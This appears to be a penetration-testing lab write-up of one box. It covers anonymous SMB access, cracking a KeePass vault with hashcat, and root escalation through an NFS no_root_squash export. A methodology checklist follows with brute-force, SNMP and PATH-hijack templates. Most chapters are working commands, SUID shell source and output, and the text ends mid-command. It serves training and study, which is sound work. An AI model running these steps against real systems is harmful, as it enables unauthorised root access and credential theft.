Anonymous SMB

Nine folders and one file with content

The host exposes three services: SSH, Samba and NFS. Samba answers first, and it answers without a password.

1.4 Why the decoys work

A share called Backup, nine folders, and files named important.pdf, finances.pdf, departments.xlsx invite exactly the wrong behaviour: open each one, look for a password, waste the hour. The files are empty on purpose.

The useful habit is mechanical: sort by size, ignore the zero-byte noise, and look at what is left. One find -size +0 removes the entire distraction layer.

Observation Meaning
Backup share, anonymous no credential needed to read the whole thing
nine folders of 0-byte PDFs deliberate noise
one 3.4 KB keys.kdbx a KeePass vault — cracking target

02

The KeePass vault

keepass2john, hashcat, pykeepass

A KeePass database is an encrypted XML container. keepass2john turns the header into a hash that hashcat mode 13400 understands, and rockyou.txt does the rest.

2.1 Extract the hash

command
keepass2john keys.kdbx > keepass.hash
cat keepass.hash
output
keys:$keepass$*2*6000*0*[redacted]*[redacted]*[redacted]*[redacted]*[redacted]*[redacted]

The fields encode the KDBX version, the transformation rounds and the master seed. Nothing here is useful without the master password, which is the point.

2.2 Crack it

command
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
output
hashcat (v6.2.6) starting
...
KEEPFILE: Mode 13400 (KeePass 1/2)
...
Recovered........: 1/1 (100.00%) Digests

-m 13400 is the only detail that matters: without it hashcat either refuses the hash or runs the wrong algorithm at a fraction of the speed. KeePass is deliberately slow to guess, which is why the recovered password is a predictable one rather than a random string.

command
hashcat -m 13400 keepass.hash --show
output
keys.kdbx:[redacted]

2.3 Read the vault

KeePass stores entries as title / username / password. pykeepass opens the file with the recovered master password and lists them without a GUI:

command
python3 -m pip install pykeepass
python3 -c 'from pykeepass import PyKeePass; \
kp = PyKeePass("keys.kdbx", password="[redacted]"); \
[print(e.title, "|", e.username, "|", e.password) for e in kp.entries]'
output
SSH | matt | [redacted]

One entry, and it is the one that matters: a username and a password for SSH.

2.4 Why this works, and when it will not

Condition Effect
a predictable master password rockyou.txt recovers it in minutes
KeePass 2 with default rounds slow per guess, but a dictionary word still falls
a long passphrase master password this path ends here; the vault is not the way in

The lesson is not "crack KeePass" — it is a backup share is a credential store. A vault copied into Backup turns nine folders of empty PDFs into one credential, and the rest of the box follows from it.

3.4 Before escalating: what to look at

On a Linux box with a shell, the checklist that matters is short:

command
id                     # groups, before anything else
sudo -l                # what the account may run as root
ss -tuln               # services that are only reachable locally
cat /etc/exports       # NFS exports and their options
mount | grep nfs       # what is already mounted
find / -perm -4000 2>/dev/null   # SUID binaries

id gave the group. ss -tuln shows nfsd and the Samba stack. /etc/exports is the file that ends the box — see the next chapter.

04

The export that ends the box

LinPEAS, /etc/exports, no_root_squash

A shell on the host is worth more than any port scan, because the file that decides the privilege escalation is only readable from inside.

4.1 What is listening

command
matt@oscp:~$ ss -tuln
output
Netid State  Local Address:Port  Peer Address:Port
udp   UNCONN 0.0.0.0:111         0.0.0.0:*
udp   UNCONN 0.0.0.0:2049        0.0.0.0:*
tcp   LISTEN 0.0.0.0:22          0.0.0.0:*
tcp   LISTEN 0.0.0.0:111         0.0.0.0:*
tcp   LISTEN 0.0.0.0:2049        0.0.0.0:*
tcp   LISTEN 0.0.0.0:139         0.0.0.0:*
tcp   LISTEN 0.0.0.0:445         0.0.0.0:*

2049 is NFS and 111 is rpcbind, the portmapper an NFSv3 client asks before it knows where mountd is. Both are worth a look from the outside, but the configuration that matters is a text file.

4.2 LinPEAS finds the line

An automated enumeration run reaches the NFS section quickly:

command
matt@oscp:~$ ./linpeas.sh -a 2>/dev/null | tee linpeas.txt
output
╔══════════╣ Analyzing NFS Exports Files (Limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/usr/upload localhost(rw,sync,no_root_squash)

One line, and it is the privilege escalation: a directory exported to localhost with no_root_squash. LinPEAS prints the export itself, not the permissions of /etc/exports — those are worth checking by hand, and they turn out to matter just as much (§4.6).

4.3 Read it directly

Automated output is a pointer, not the evidence. Confirm by hand:

command
matt@oscp:~$ cat /etc/exports
output
## /etc/exports: the access control list for filesystems which may be exported
##               to NFS clients.  See exports(5).
##
## Example for NFSv2 and NFSv3:
## /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
##
## Example for NFSv4:
## /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
## /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
##
/usr/upload localhost(rw,sync,no_root_squash)

The stock comment block is untouched; the only live line is the last one. It does not yet carry insecure — that token is added in the next chapter, when the mount has to travel through a tunnel.

4.4 What no_root_squash does

NFS maps the client's users onto the server's users by UID. By default (root_squash) a request that arrives as UID 0 is rewritten to nobody, so a client's root cannot create root-owned files on the server.

no_root_squash turns that mapping off:

Option Client UID 0 creates files owned by Consequence
root_squash (default) nobody / nogroup a client root is harmless on the export
no_root_squash root (UID 0) on the server a client root writes files the server treats as its own

That single difference is the whole escalation: place a binary on the export from a machine where you are root, set the SUID bit, and the server now holds a root-owned SUID binary.

4.5 What localhost and insecure do

localhost is not "any client". It is the address the server sees as the source of the mount request, so only a mount that originates on the server itself matches the rule.

insecure relaxes the reserved-port requirement. NFS by default accepts requests only from source ports below 1024 (secure); a mount forwarded through an SSH tunnel arrives from an ephemeral port, so without insecure the server refuses it even though the address is now 127.0.0.1.

Token Effect on this box
rw read and write on the export
sync writes acknowledged after they are committed — no exploitation value
no_root_squash client root keeps UID 0 on the server
insecure not present yet; needed once the mount is tunnelled (chapter 05)

4.6 The other way in: the file is writable

matt is in adm:

command
matt@oscp:~$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt),1001(adm)

and /etc/exports is -rw-rw-r-- root adm. Group adm can write it, so matt can change the export options without sudo and without touching anything else on the host. That is why the box does not need a kernel exploit: the misconfiguration is editable by the account we already have.

05

Why the direct mount is refused

localhost, reserved ports, insecure

An NFS export with no_root_squash looks like a one-command win. From the exam network it is not: the mount is refused before any file is written.

5.1 The obvious attempt

command
kali@kali:~/exam$ sudo mkdir -p /mnt/nfs
kali@kali:~/exam$ sudo mount -t nfs 172.16.97.110:/usr/upload /mnt/nfs
output
mount.nfs: access denied by server while mounting 172.16.97.110:/usr/upload

The server answered — this is not a firewall drop, a timeout or a missing nfs-common. It parsed the request, compared the client against the export rule, and said no.

5.2 The rule is the reason

The export is:

output
/usr/upload localhost(rw,sync,no_root_squash)

localhost is matched against the source address of the mount request. From Kali that address is 10.10.14.47, which is not 127.0.0.1, so the server refuses the mount. The no_root_squash option never comes into play: the mount is rejected at the authorization step.

output
client 10.10.14.47  ──►  172.16.97.110:2049   source address ≠ localhost   ✗

This is also why scanning harder does not help. The port is open, the service is healthy, and the answer is a policy decision. More enumeration produces the same denial.

5.3 Attempts on the host itself

Mounting the export from the target to prove it works is a reasonable check, but the mount point has to exist and the options have to be valid:

command
matt@oscp:~$ mount -t nfs 127.0.0.1:/usr/upload /home/matt/Desktop
mount: /home/matt/Desktop: can't find in /etc/fstab.
command
matt@oscp:~$ mount -t nfs -o rw localhost:/usr/upload /mnt
mount.nfs: failed to apply fstab options

Both errors are local: a mount point that does not exist, and a helper that cannot apply the option string. Neither says anything about the export. On the host, sudo mount -t nfs 127.0.0.1:/usr/upload /mnt/nfs succeeds, because the source address really is 127.0.0.1 — a useful confirmation that the export itself is fine.

5.4 The missing option

insecure is not cosmetic. Even once the request appears to come from 127.0.0.1, NFS applies the reserved-port rule: a request must originate from a source port below 1024. A mount forwarded through an SSH tunnel leaves the client from an ephemeral port, so the server sees a high port and refuses under the default secure behaviour.

The export file is writable by group adm, and matt is in adm, so the fix does not need root on the target. It does need care: sed -i writes a temporary file next to the original and renames it, which requires write permission on /etc itself — and matt does not have that. The content can be replaced, the inode cannot:

command
matt@oscp:~$ cp /etc/exports /tmp/exports
matt@oscp:~$ sed -i 's/no_root_squash)/no_root_squash,insecure)/' /tmp/exports
matt@oscp:~$ cat /tmp/exports > /etc/exports
matt@oscp:~$ tail -n 1 /etc/exports
/usr/upload localhost(rw,sync,no_root_squash,insecure)

cat > file truncates and writes the existing inode, so file write permission is enough. The same edit attempted as sed -i /etc/exports fails with sed: couldn't open temporary file /etc/sedXXXXXX: Permission denied, even though the file itself is writable.

The export table is rebuilt from the file when it changes, so no service restart or exportfs call is needed — and matt could not run one anyway.

output
-rw-rw-r-- 1 root adm 404 Jul 21 20:11 /etc/exports

The modification time records the edit. Nothing else on the host was modified to make the escalation work.

5.5 What the failures teach

Symptom Wrong conclusion Actual cause
access denied by server firewall, wrong port, bad nfs-common source address does not match localhost
can't find in /etc/fstab the export is broken the mount point does not exist on the client
failed to apply fstab options unsupported NFS version malformed option string on the command line
works on the host, fails from Kali the export is read-only same address rule, different source

The box is not defended by a patch. It is defended by an address restriction that a tunnel satisfies and by a port rule that one extra option disables.

06

Through the tunnel

ssh -L 2049 and a loopback mount

The export only answers localhost. The way to become localhost is not to spoof an address but to let the target make the connection to itself — with an SSH forward carrying it.

6.1 The idea

An SSH local forward opens a listening port on the client and, for every connection it receives, opens a matching connection from the SSH server. The server-side connection originates on the server, so its source address is 127.0.0.1 as far as the NFS daemon is concerned.

output
kali 127.0.0.1:2049  ──ssh──►  oscp 127.0.0.1:2049
      (mount runs here)         (rpc.nfsd sees a local client)

Two details make it work:

Detail Why it matters
localhost in -L is resolved on the server the forward terminates on the target's loopback, not on Kali's
the tunnel's server-side socket uses an ephemeral port the export needs insecure, added in the previous chapter

6.2 Open the forward

command
kali@kali:~/exam$ ssh -L 2049:localhost:2049 matt@172.16.97.110
output
matt@172.16.97.110's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-84-generic x86_64)
...
matt@oscp:~$

Leave this session open. It is the transport for the mount, not just a shell.

-L 2049:localhost:2049 reads as local port : destination host : destination port. The destination host is evaluated by sshd on the target, which is why the export sees a loopback client.

Binding port 2049 locally is below 1024; Kali allows unprivileged low-port binds (net.ipv4.ip_unprivileged_port_start=0), so the forward does not need sudo. On a host that keeps the default limit of 1024, use the high-port variant in §6.5.

6.3 Mount through loopback

In a second terminal on Kali:

command
kali@kali:~/exam$ sudo mkdir -p /mnt/nfs
kali@kali:~/exam$ sudo mount -t nfs 127.0.0.1:/usr/upload /mnt/nfs
kali@kali:~/exam$ mount | grep /mnt/nfs
output
127.0.0.1:/usr/upload on /mnt/nfs type nfs4 (rw,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=127.0.0.1,local_lock=none,addr=127.0.0.1)

No access denied. The path in the mount table says 127.0.0.1:/usr/upload, but every byte of that traffic is travelling to 172.16.97.110 inside the SSH session and arriving on its loopback interface.

type nfs4 is what makes a single forwarded port sufficient. NFSv4 carries the mount protocol inside the same connection on 2049; it has no separate rpcbind or mountd lookup. An NFSv3 mount would first ask the portmapper on 111 where mountd lives, and neither port is forwarded here — the mount would fail even with insecure set. If a server only offers v3, forward 111 and 20048 as well and mount with -o vers=3.

command
kali@kali:~/exam$ ls -la /mnt/nfs
output
total 8
drwxr-xr-x 2 root root 4096 Jul 21 20:11 .
drwxr-xr-x 1 root root 4096 Jul 21 20:12 ..

The directory is empty and owned by root — the same directory the target sees as /usr/upload.

6.4 Why the two failures are gone

Previous failure What changed
access denied by server the request now originates from the target's 127.0.0.1, matching localhost
high source port rejected insecure was added to the export line

Both conditions are required. A tunnel without insecure still fails the port check; insecure without a tunnel still fails the address check.

6.5 If port 2049 is already taken locally

Binding 2049 on Kali fails if another NFS client or a previous tunnel still holds it. Any local port works as long as the mount is told which one to use:

command
kali@kali:~/exam$ ssh -L 3049:localhost:2049 matt@172.16.97.110
kali@kali:~/exam$ sudo mount -t nfs -o port=3049 127.0.0.1:/usr/upload /mnt/nfs

-o port=3049 changes the destination port the client dials; the SSH forward rewrites it to 2049 on the target.

6.6 Keep the session, and unmount first

The mount is hard by default: if the SSH session dies, every process touching /mnt/nfs blocks in uninterruptible I/O until the mount is removed. In order:

command
kali@kali:~/exam$ sudo umount /mnt/nfs
kali@kali:~/exam$ exit          # close the SSH session last

For lab work a soft mount with a short timeout avoids a wedged terminal, at the cost of I/O errors instead of retries:

command
kali@kali:~/exam$ sudo mount -t nfs -o soft,timeo=50,retrans=1 127.0.0.1:/usr/upload /mnt/nfs

The export is now writable from a machine where we are root. That is the last precondition.

07

A root-owned SUID binary

shell.c, chmod +s, proof.txt

no_root_squash means a file written to the export by Kali's root is owned by the target's root. Add the SUID bit and the target has a root binary that any local user can run.

7.1 The payload

output
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

setuid(0) and setgid(0) set the real IDs as well as the effective ones. With the SUID bit the effective UID is already 0; setting the real UID makes the shell start as root in every respect, which avoids a shell that reports uid=0 but cannot read /root.

7.2 Compile

command
kali@kali:~/exam$ gcc shell.c -o shell
kali@kali:~/exam$ file shell
output
shell: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=[redacted], for GNU/Linux 3.2.0, not stripped

It must be compiled for the target's architecture — x86-64 here, matching the Ubuntu host.

7.3 Place it on the export as root

command
kali@kali:~/exam$ sudo cp shell /mnt/nfs/shell
kali@kali:~/exam$ ls -l /mnt/nfs/shell
output
-rwxr-xr-x 1 root root 16112 Jul 21 20:19 /mnt/nfs/shell

The owner is root, not kali and not nobody. That is no_root_squash working: the write came from a UID-0 process on the client and the server stored it as UID 0.

7.4 Set the SUID bit

command
kali@kali:~/exam$ sudo chmod +s /mnt/nfs/shell
kali@kali:~/exam$ ls -l /mnt/nfs/shell
output
-rwsr-sr-x 1 root root 16112 Jul 21 20:19 /mnt/nfs/shell

The s in the owner-execute position is the SUID bit; the s in the group position is SGID. Both matter here because the payload calls both setuid(0) and setgid(0).

7.5 Run it on the target

Back in the SSH session:

command
matt@oscp:~$ ls -l /usr/upload/shell
output
-rwsr-sr-x 1 root root 16112 Jul 21 20:19 /usr/upload/shell

The same inode, seen from the server: root-owned, SUID, in a directory matt can execute from.

command
matt@oscp:~$ /usr/upload/shell
root@oscp:~# id
output
uid=0(root) gid=0(root) groups=0(root),1001(adm)
command
root@oscp:~# cat /root/proof.txt
output
[redacted]

7.6 The flag

Host File Value
172.16.97.110 /root/proof.txt [redacted]

Both halves of the box are done: local.txt as matt, proof.txt as root.

7.7 Why it works — and what would stop it

Condition Effect
no_root_squash on the export the copied binary is owned by the server's root
SUID bit set over the mount the bit is stored on the server's filesystem, not stripped by NFS
export mounted without nosuid the kernel honours the bit when the file is executed
a filesystem mounted nosuid SUID is ignored — this path fails regardless of ownership
root_squash (default) the binary would be owned by nobody; SUID would give nobody, not root

The chain has no exploit code and no CVE. It is a file permission granted by a mount option:

output
export option  →  file owner  →  SUID bit  →  root shell

7.8 Cleanup

The binary stays in /usr/upload until it is removed, and it is a root shell for anyone on the box. After capturing the flag:

command
root@oscp:~# rm -f /usr/upload/shell
root@oscp:~# exit
command
kali@kali:~/exam$ sudo umount /mnt/nfs
kali@kali:~/exam$ exit

Removing the SUID binary and closing the tunnel leaves the host as it was found, apart from the insecure token added to /etc/exports — which is the misconfiguration that made the box solvable and should be reverted by the owner.

08

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Reconstructing source from a small binary:

output
+ setuid / setgid  →  setuid(0); setgid(0);
+ lea rdi,[rip+...] →  the argument is a fixed string
+ call system@plt  →  system("...")

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

Interactive variant:

command
printf '#!/bin/bash\n/bin/bash -p\n' > "$D/chpasswd"; chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary

command
D=$(mktemp -d /tmp/c.XXXXXX)
